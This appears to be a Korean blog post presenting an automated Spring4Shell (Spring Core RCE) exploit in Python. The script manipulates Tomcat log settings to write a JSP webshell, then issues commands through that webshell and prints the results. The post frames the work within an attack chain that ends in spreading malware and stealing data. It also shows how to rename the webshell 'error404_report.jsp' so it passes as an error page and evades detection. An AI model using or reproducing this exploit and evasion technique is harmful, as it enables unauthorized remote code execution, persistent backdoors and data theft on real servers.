PoC 자동화

기존 PoC 코드를 사용하면 하나의 불편한 점이 있다.

바로 생성한 웹쉘을 내가 직접 복사하거나 입력하여 접속해야 한다.

 

그래서 나의 목표는 PoC 코드를 실행하면 웹쉘에서 해당 명령어를 사용하고

출력한 내용을 터미널에서 볼 수 있게 하는 것이다.

 

수정한 PoC 코드는 다음과 같다.

 

import requests
import argparse
from urllib.parse import urlparse
import time
import sys
import os 
import urllib.parse 

requests.packages.urllib3.disable_warnings()

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # 이 'c': 'Runtime' 설정은 일부 필터링을 우회하는 데 사용됩니다.
    "c": "Runtime",
}

def execute_shell_command(target_url, filename, app_path, command="id"):
    """웹쉘에 접속하여 명령을 실행하고 결과를 출력합니다."""
    
    parsed_url = urlparse(target_url)
    shell_url = f"{parsed_url.scheme}://{parsed_url.netloc}{app_path}/{filename}.jsp"
    
    print(f"\n[*] 웹쉘 접속 및 명령 실행 시도: {shell_url}?cmd={command}")
    
    try:
        shell_response = requests.get(shell_url, params={"cmd": command}, verify=False, timeout=10)
        
        if shell_response.status_code == 200:
            result = shell_response.text.strip()
            
            if not result:
                print(f"[+] 명령 실행 성공. (HTTP 200) 하지만 결과가 비어있습니다. 출력 안정화가 필요합니다.")
            else:
                 print(f"[+] 명령 실행 성공. 결과 스니펫:\n---")
                 print(result[:500] + ('...' if len(result) > 500 else ''))
                 
            print("---")
            return result
        else:
            print(f"[-] 웹쉘 접속 실패. HTTP 상태 코드: {shell_response.status_code}")
            if shell_response.status_code == 500:
                 print(f"[!] Tomcat이 웹쉘 파일을 찾았으나, 실행 중 오류가 발생했습니다. 코드 구문 오류일 수 있습니다.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] 웹쉘 연결 오류 발생: {e}")
        return None

def run_exploit(url, directory, filename):
    """실제로 Tomcat 설정을 조작하여 웹쉘을 생성합니다."""
    
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    
    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] 로그 변수 리셋 시도.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, timeout=5)
    print("[*] 응답 코드: %d" % ret.status_code)

    print("[*] 로그 설정 변수 수정 시도 (웹쉘 페이로드 전송)")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, timeout=5)
    print("[*] 응답 코드: %d" % ret.status_code)

    time.sleep(3)

    ret = requests.get(url, headers=get_headers, verify=False, timeout=5)
    print("[*] GET 요청 전송 (웹쉘 파일 생성 트리거). 응답 코드: %d" % ret.status_code)

    time.sleep(1)

    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] 로그 패턴 변수 리셋 시도.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False, timeout=5)
    print("[*] 응답 코드: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE (Spring4Shell) 자동 검증 스크립트')
    parser.add_argument('--url', help='target url (예: http://localhost:8080/helloworld/greeting)', required=True)
    parser.add_argument('--file', help='생성할 웹쉘 파일명 (확장자 제외)', required=False, default="shell")
    parser.add_argument('--dir', help='웹쉘을 생성할 디렉토리 (자동 감지되므로 건드리지 않는 것을 추천)',
                        required=False) 

    args = parser.parse_args()
    
    url_arg = args.url
    dir_arg = args.dir
    file_arg = args.file

    filename = file_arg.replace(".jsp", "")
    
    parsed_url = urlparse(url_arg)
    path_segments = [s for s in parsed_url.path.split('/') if s]
    
    app_context = ""
    if path_segments:
        app_context = "/" + path_segments[0]
        app_dir = path_segments[0]
    else:
        app_context = "" 
        app_dir = "ROOT"

    if not dir_arg:
        dir_arg = f"webapps/{app_dir}"
        print(f"[*] 디렉토리 자동 감지: 컨텍스트 경로 '{app_context}'에 맞춰 웹쉘 디렉토리를 '{dir_arg}'로 설정합니다.")
    else:
        print(f"[*] 사용자가 디렉토리: '{dir_arg}'를 지정했습니다. 자동 감지 기능이 적용되지 않습니다.")
    # ----------------------------------------------------

    try:
        run_exploit(url_arg, dir_arg, filename)
        print("[+] 익스플로잇 완료.")
        
        execute_shell_command(url_arg, filename, app_context, command="id") 
        
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()

공격 시나리오 우회

공격 시나리오는 다음과 같다.

 

1. 취약한 대상을 탐색한다.

2. Spring4Shell 취약점을 실행한다.

3. 웹 쉘을 생성한다.

4. 악성코드를 전파한다.

5. 중요정보를 탈취한다.

 

나는 3번을 주목하였다.

웹 쉘을 생성하는 과정에서 웹 쉘은 shell.jsp 라는 이름을 생성된다.

만약 탐지를 한다면 shell.jsp 는 바로 탐지되어 웹 쉘을 사용하기 힘들 것이다.

 

그렇기 때문에 shell.jsp 의 이름을 바꾸어 탐지하는 데 더욱 오래 걸리도록 만들었다.

shell.jsp 를 오류 페이지처럼 보이게 하기 위해 error404_report.jsp 로 변경하였다.

 

방법은 다음과 같다.

# 변경 전
parser.add_argument('--file', help='생성할 웹쉘 파일명 (확장자 제외)', required=False, default="shell")

# 변경 후
parser.add_argument('--file', help='생성할 웹쉘 파일명 (확장자 제외)', required=False, default="error404_report")

 

다시 코드를 실행시키면 결과 창에서 shell.jsp 에서 error404_report.jsp 로 변경된 것을 알 수 있다.
